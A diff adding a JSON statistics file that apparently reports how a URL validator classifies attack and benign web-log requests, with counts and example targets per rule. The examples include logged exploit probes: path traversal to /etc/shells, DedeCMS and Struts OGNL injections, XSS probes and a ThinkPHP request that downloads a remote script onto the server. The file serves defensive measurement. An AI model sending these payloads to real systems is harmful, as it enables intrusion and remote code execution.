+     "//plus/erraddsave.php?dopost=saveedit&a=b&arrs1[]=99&c=d&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=1",
+     "//plus/download.php?open=1&c=d&arrs1[]=99&a=b&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=",
+     "//plus/erraddsave.php?dopost=saveedit&c=d&arrs1[]=99&a=b&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=1",
+     "//plus/download.php?open=1&c=d&arrs1[]=99&a=b&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]="
+    ]
+   },
+   "q.dup_name": {
+    "lines": 146,
+    "pct_lines": 0.0064,
+    "sole_cause_lines": 47,
+    "pct_sole": 0.0021,
+    "unique_targets": 103,
+    "pct_unique": 0.1606,
+    "examples": [
+     "//plus/erraddsave.php?dopost=saveedit&a=b&arrs1[]=99&c=d&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=1",
+     "//plus/download.php?open=1&c=d&arrs1[]=99&a=b&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=",
+     "//plus/erraddsave.php?dopost=saveedit&c=d&arrs1[]=99&a=b&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=1",
+     "//plus/download.php?open=1&c=d&arrs1[]=99&a=b&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=",
+     "//plus/download.php?open=1&c=d&arrs1[]=99&a=b&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=",
+     "//plus/download.php?open=1&c=d&arrs1[]=99&a=b&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]="
+    ]
+   },
+   "h.userinfo": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.ip_literal": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.bad_port": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.non_ascii": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.too_long": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.trailing_dot": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.ipv4_noncanonical": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.underscore": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.label_not_ldh_other": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.reserved_rldh": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.bad_alabel": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.uppercase_repaired": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.port_nondefault": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.alabel_ok": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.ipv4_ok": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "p.enc_unreserved_repaired": {
+    "lines": 106,
+    "pct_lines": 0.0047,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 66,
+    "pct_unique": 0.1029,
+    "examples": [
+     "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shells",
+     "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/shells",
+     "/images/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shells",
+     "/images/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/shells",
+     "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shells",
+     "/%24%7B%28%40%63%6F%6D%2E%6F%70%65%6E%73%79%6D%70%68%6F%6E%79%2E%77%65%62%77%6F%72%6B%2E%53%65%72%76%6C%65%74%41%63%74%69%6F%6E%43%6F%6E%74%65%78%74%40%67%65%74"
+    ]
+   },
+   "p.lowercase_hex_repaired": {
+    "lines": 15,
+    "pct_lines": 0.0007,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 12,
+    "pct_unique": 0.0187,
+    "examples": [
+     "/system/refinery/images/W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvc2hlbGxzIiwgIm91dCJdXQ%3d%3d/test.jpeg",
+     "/system/images/W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvc2hlbGxzIiwgIm91dCJdXQ%3d%3d/test.jpeg",
+     "/Datasets%20Description/Network/HttP:%2f%2fbxss.me%2ft%2fxss.html%3f%2500.html",
+     "/Datasets%20Description/Network/bxss.me%2ft%2fxss.html%3f%2500.html",
+     "/Datasets%20Description/HttP:%2f%2fbxss.me%2ft%2fxss.html%3f%2500/dhcp.html",
+     "/HttP:%2f%2fbxss.me%2ft%2fxss.html%3f%2500/PE_malware/OPCleaver.html"
+    ]
+   }
+  },
+  "ref_reasons_top": {
+   "308 path: trailing slash, X": 96503,
+   "400 path: empty segment": 22517,
+   "400 query: pair must be exactly name=value": 20874,
+   "400 path: not origin-form": 10225,
+   "400 query: ambiguous percent-escape X": 3857,
+   "400 query: forbidden character X": 2514,
+   "400 path: forbidden character X": 2018,
+   "400 path: ambiguous percent-escape X": 1521,
+   "400 path: dot segment": 58,
+   "400 query: duplicate name": 50,
+   "400 path: bad percent-escape": 22,
+   "400 query: empty pair": 9,
+   "400 query: empty name": 5,
+   "400 query: bad percent-escape": 3
+  }
+ },
+ "benign": {
+  "lines": 1654694,
+  "unique_targets": 29630,
+  "ref_reject_lines": 32423,
+  "pct_ref_reject": 1.9595,
+  "ref_308_lines": 18104,
+  "pct_ref_308": 1.0941,
+  "clauses": {
+   "p.not_origin_form": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "p.too_long": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "p.bad_pct": {
+    "lines": 1,
+    "pct_lines": 0.0001,
+    "sole_cause_lines": 1,
+    "pct_sole": 0.0001,
+    "unique_targets": 1,
+    "pct_unique": 0.0034,
+    "examples": [
+     "/self.logs/%s"
+    ]
+   },
+   "p.enc_slash": {
+    "lines": 1,
+    "pct_lines": 0.0001,
+    "sole_cause_lines": 1,
+    "pct_sole": 0.0001,
+    "unique_targets": 1,
+    "pct_unique": 0.0034,
+    "examples": [
+     "/Security-Data-Analysis/Lab_1/www.sparklingbooks.com%2Fthe_sicilian_womans_daughter.html"
+    ]
+   },
+   "p.enc_backslash": {
+    "lines": 58,
+    "pct_lines": 0.0035,
+    "sole_cause_lines": 53,
+    "pct_sole": 0.0032,
+    "unique_targets": 13,
+    "pct_unique": 0.0439,
+    "examples": [
+     "/honeypot/%5C%22https:/twitter.com/sooshie%5C%22",
+     "/honeypot/%5C%22https:/twitter.com/theroxyd%5C%22",
+     "/honeypot/%5C%22http:/amunhoney.sourceforge.net/%5C%22",
+     "/honeypot/%5C%22http:/glastopf.org/%5C%22",
+     "/honeypot/%5C%22http:/www.maxmind.com%5C%22",
+     "/honeypot/%5C%22https://twitter.com/sooshie%5C%22"
+    ]
+   },
+   "p.enc_semicolon": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "p.enc_nul": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "p.enc_pct": {
+    "lines": 157,
+    "pct_lines": 0.0095,
+    "sole_cause_lines": 129,
+    "pct_sole": 0.0078,
+    "unique_targets": 91,
+    "pct_unique": 0.3071,
+    "examples": [
+     "/Datasets%2520Description/HTML_Bro_log_2/%20http:/gauss.ececs.uc.edu/Courses/c6055/pdf/bro_log_vars.pdf",
+     "/Datasets%2520Description/PE_malware/%20https:/cyber.bgu.ac.il/wp-content/uploads/2017/10/07346821.pdf",
+     "/Datasets%2520Description/HTML_Bro_log_1/%20http:/gauss.ececs.uc.edu/Courses/c6055/pdf/bro_log_vars.pdf",
+     "/Datasets%2520Description/PE_malware/%20https:/alrawi.github.io/static/papers/unzeus_www13.pdf",
+     "/Datasets%2520Description/Network/%20http:/gauss.ececs.uc.edu/Courses/c6055/pdf/bro_log_vars.pdf",
+     "/Datasets%2520Description/PE_malware/%20http:/arxiv.org/pdf/1803.04173.pdf"
+    ]
+   },
+   "p.enc_ctrl": {
+    "lines": 2,
+    "pct_lines": 0.0001,
+    "sole_cause_lines": 2,
+    "pct_sole": 0.0001,
+    "unique_targets": 1,
+    "pct_unique": 0.0034,
+    "examples": [
+     "/%0A.book.com"
+    ]
+   },
+   "p.enc_nonascii": {
+    "lines": 494,
+    "pct_lines": 0.0299,
+    "sole_cause_lines": 491,
+    "pct_sole": 0.0297,
+    "unique_targets": 33,
+    "pct_unique": 0.1114,
+    "examples": [
+     "/%C2%A0%C2%A0",
+     "/%C3%82%C2%A0%C3%82",
+     "/%C2%A0",
+     "/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E6%95%B0%E6%8D%AE%E6%A0%B7%E6%9C%AC%E9%9B%86",
+     "/%D0%BA%E2%B2%B4%E1%AE%A0%E1%A6%9E%E1%92%A6%E1%AE%A4%E2%A8%B6%E1%A1%80%E4%87%9D",
+     "/Security-Data-Analysis/Lab_1/conn.log.zip%C3%BC"
+    ]
+   },
+   "p.raw_nonascii": {
+    "lines": 1633,
+    "pct_lines": 0.0987,
+    "sole_cause_lines": 1603,
+    "pct_sole": 0.0969,
+    "unique_targets": 141,
+    "pct_unique": 0.4759,
+    "examples": [
+     "/\\xd0\\xc2\\xbd\\xa8\\xce\\xc4\\xbc\\xfe\\xbc\\xd0.rar",
+     "/\\xd0\\xc2\\xbd\\xa8\\xce\\xc4\\xbc\\xfe\\xbc\\xd0.zip",
+     "/\\xd0\\xc2\\xbd\\xa8\\xce\\xc4\\xbc\\xfe\\xbc\\xd0.tar.gz",
+     "/\\xd0\\xc2\\xbd\\xa8\\xce\\xc4\\xbc\\xfe\\xbc\\xd0.7z",
+     "/\\xb1\\xb8\\xb7\\xdd.rar",
+     "/\\xb1\\xb8\\xb7\\xdd.zip"
+    ]
+   },
+   "p.backslash": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "p.semicolon": {
+    "lines": 8,
+    "pct_lines": 0.0005,
+    "sole_cause_lines": 6,
+    "pct_sole": 0.0004,
+    "unique_targets": 5,
+    "pct_unique": 0.0169,
+    "examples": [
+     "/;",
+     "/admin_aspcms/_system/AspCms_SiteSetting.asp%22%20%22Mozilla/5.0%20(compatible;%20MSIE%2010.0;%20Windows%20NT%206.2)%22",
+     "//&quot;",
+     "/&nbsp;",
+     "/;There"
+    ]
+   },
+   "p.space": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "p.fragment": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "p.raw_ctrl": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "p.other_forbidden_ascii": {
+    "lines": 30,
+    "pct_lines": 0.0018,
+    "sole_cause_lines": 20,
+    "pct_sole": 0.0012,
+    "unique_targets": 10,
+    "pct_unique": 0.0337,
+    "examples": [
+     "/[37",
+     "/\"",
+     "/<",
+     "/](http://www.secrepo.com",
+     "/maccdc2012/[22",
+     "/[25]"
+    ]
+   },
+   "p.dot_segment": {
+    "lines": 3,
+    "pct_lines": 0.0002,
+    "sole_cause_lines": 3,
+    "pct_sole": 0.0002,
+    "unique_targets": 2,
+    "pct_unique": 0.0067,
+    "examples": [
+     "/self.logs/.",
+     "/."
+    ]
+   },
+   "p.empty_segment": {
+    "lines": 9023,
+    "pct_lines": 0.5453,
+    "sole_cause_lines": 8992,
+    "pct_sole": 0.5434,
+    "unique_targets": 6590,
+    "pct_unique": 22.241,
+    "examples": [
+     "//bootstrap/img/favicon.ico",
+     "/honeypot//%22http://amunhoney.sourceforge.net//%22",
+     "/honeypot//%22http://glastopf.org//%22",
+     "/honeypot//%22http://www.maxmind.com/%22",
+     "/honeypot//%22https://twitter.com/sooshie/%22",
+     "/honeypot//%22https://twitter.com/theroxyd/%22"
+    ]
+   },
+   "p.trailing_slash_308": {
+    "lines": 37831,
+    "pct_lines": 2.2863,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 1012,
+    "pct_unique": 3.4155,
+    "examples": [
+     "/self.logs/2015/?C=D;O=A",
+     "/self.logs/2015/?C=N;O=D",
+     "/self.logs/2016/?C=M;O=A",
+     "/Datasets%20Description/Network/?C=D%3BO%3DA",
+     "/self.logs/?C=S;O=A",
+     "/self.logs/?C=N;O=D"
+    ]
+   },
+   "q.too_long": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "q.empty_pair": {
+    "lines": 7,
+    "pct_lines": 0.0004,
+    "sole_cause_lines": 7,
+    "pct_sole": 0.0004,
+    "unique_targets": 7,
+    "pct_unique": 0.0236,
+    "examples": [
+     "/maccdc2012/http.log.gz?&range=0",
+     "/maccdc2012/http.log.gz?&range=6927373",
+     "/maccdc2012/http.log.gz?&range=10044020",
+     "/maccdc2012/http.log.gz?&range=10728986",
+     "/maccdc2012/http.log.gz?&range=16387472",
+     "/maccdc2012/http.log.gz?&range=17279158"
+    ]
+   },
+   "q.no_eq": {
+    "lines": 122,
+    "pct_lines": 0.0074,
+    "sole_cause_lines": 92,
+    "pct_sole": 0.0056,
+    "unique_targets": 25,
+    "pct_unique": 0.0844,
+    "examples": [
+     "/robots.txt?1709465443916",
+     "/robots.txt?1718689089239",
+     "/\\xef\\xbf\\xbd\\xef\\xbf\\xbd\\xef\\xbf\\xbd\\xef\\xbf\\xbd\\xef\\xbf?rar",
+     "/\\xef\\xbf\\xbd\\xef\\xbf\\xbd\\xef\\xbf\\xbd\\xef\\xbf\\xbd\\xef\\xbf?tar.gz",
+     "/\\xef\\xbf\\xbd\\xef\\xbf\\xbd\\xef\\xbf\\xbd\\xef\\xbf\\xbd\\xef\\xbf?zip",
+     "/\\xef\\xbf\\xbd\\xef\\xbf\\xbd\\xef\\xbf\\xbd\\xef\\xbf\\xbd\\xde\\xb8\\xc4\\xb0\\xef\\xbf?rar"
+    ]
+   },
+   "q.multi_eq": {
+    "lines": 16952,
+    "pct_lines": 1.0245,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 201,
+    "pct_unique": 0.6784,
+    "examples": [
+     "/self.logs/2015/?C=D;O=A",
+     "/self.logs/2015/?C=N;O=D",
+     "/self.logs/2016/?C=M;O=A",
+     "/self.logs/?C=S;O=A",
+     "/self.logs/?C=N;O=D",
+     "/self.logs/2015/?C=N;O=A"
+    ]
+   },
+   "q.empty_name": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "q.bad_pct": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "q.enc_amp_eq": {
+    "lines": 3812,
+    "pct_lines": 0.2304,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 186,
+    "pct_unique": 0.6277,
+    "examples": [
+     "/Datasets%20Description/Network/?C=D%3BO%3DA",
+     "/self.logs/?C=M%3BO%3DA",
+     "/Datasets%20Description/Network?C=D%3BO%3DA",
+     "/Datasets%20Description/HTML_Bro_log_1?C=S%3BO%3DA",
+     "/Datasets%20Description/HTML_Bro_log_1/?C=S%3BO%3DA",
+     "/Datasets%20Description?C=N%3BO%3DD"
+    ]
+   },
+   "q.enc_semicolon": {
+    "lines": 2759,
+    "pct_lines": 0.1667,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 104,
+    "pct_unique": 0.351,
+    "examples": [
+     "/Datasets%20Description/Network/?C=D%3BO%3DA",
+     "/self.logs/?C=M%3BO%3DA",
+     "/Datasets%20Description/Network?C=D%3BO%3DA",
+     "/Datasets%20Description/HTML_Bro_log_1?C=S%3BO%3DA",
+     "/Datasets%20Description/HTML_Bro_log_1/?C=S%3BO%3DA",
+     "/Datasets%20Description?C=N%3BO%3DD"
+    ]
+   },
+   "q.enc_plus": {
+    "lines": 1,
+    "pct_lines": 0.0001,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 1,
+    "pct_unique": 0.0034,
+    "examples": [
+     "/_fragment?_path=_controller%3Dphpcredits%26flag%3D2&_hash=FgjQhQLpo6fc3So5dEw4prKnIgrKlhgPPrte%2Bo%2B9yhY="
+    ]
+   },
+   "q.enc_pct": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "q.enc_nul_ctrl": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "q.enc_nonascii": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "q.plus": {
+    "lines": 209,
+    "pct_lines": 0.0126,
+    "sole_cause_lines": 209,
+    "pct_sole": 0.0126,
+    "unique_targets": 2,
+    "pct_unique": 0.0067,
+    "examples": [
+     "/?t=1&cn=ZmxleGlibGVfcmVjc18y&refsrc=email&iid=2572d65d1a814c138a77f3b60465fe37&uid=30635594&nid=244+272699400",
+     "/?t=1&cn=ZmxleGlibGVfcmVjc18y&iid=dee6e0155a3649fb944f3edea7220ae6&uid=84117791&nid=244+285282312"
+    ]
+   },
+   "q.semicolon": {
+    "lines": 18001,
+    "pct_lines": 1.0879,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 279,
+    "pct_unique": 0.9416,
+    "examples": [
+     "/self.logs/2015/?C=D;O=A",
+     "/self.logs/2015/?C=N;O=D",
+     "/self.logs/2016/?C=M;O=A",
+     "/self.logs/?C=S;O=A",
+     "/self.logs/?C=N;O=D",
+     "/self.logs/2015/?C=N;O=A"
+    ]
+   },
+   "q.raw_nonascii": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "q.space": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "q.fragment": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "q.raw_ctrl": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "q.other_forbidden_ascii": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "q.dup_name": {
+    "lines": 2,
+    "pct_lines": 0.0001,
+    "sole_cause_lines": 2,
+    "pct_sole": 0.0001,
+    "unique_targets": 1,
+    "pct_unique": 0.0034,
+    "examples": [
+     "/?s=/Home/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=copy&vars%5B1%5D%5B%5D=http://77re.cc/cmd.txt&vars%5B1%5D%5B%5D=roeter.php"
+    ]
+   },
+   "h.userinfo": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.ip_literal": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.bad_port": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.non_ascii": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.too_long": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.trailing_dot": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.ipv4_noncanonical": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.underscore": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.label_not_ldh_other": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.reserved_rldh": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.bad_alabel": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.uppercase_repaired": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.port_nondefault": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.alabel_ok": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.ipv4_ok": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "p.enc_unreserved_repaired": {
+    "lines": 9,
+    "pct_lines": 0.0005,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 4,
+    "pct_unique": 0.0135,
+    "examples": [
+     "/Datasets%20Description/PE%5fmalware/VirusShare.html",
+     "/Security-Data-Analysis/Lab%5f1/conn.log.zip",
+     "/word%70ress/",
+     "/misc/zeus%5fdga%5fdomains.txt.zip"
+    ]
+   },
+   "p.lowercase_hex_repaired": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   }
+  },
+  "ref_reasons_top": {
+   "308 path: trailing slash, X": 37567,
+   "400 query: pair must be exactly name=value": 17072,
+   "400 path: empty segment": 9003,
+   "400 query: ambiguous percent-escape X": 2698,
+   "400 path: forbidden character X": 1671,
+   "400 query: forbidden character X": 1323,
+   "400 path: ambiguous percent-escape X": 712,
+   "400 query: empty pair": 7,
+   "400 path: dot segment": 3,
+   "400 query: duplicate name": 2,
+   "400 path: bad percent-escape": 1
+  }
+ }
+}
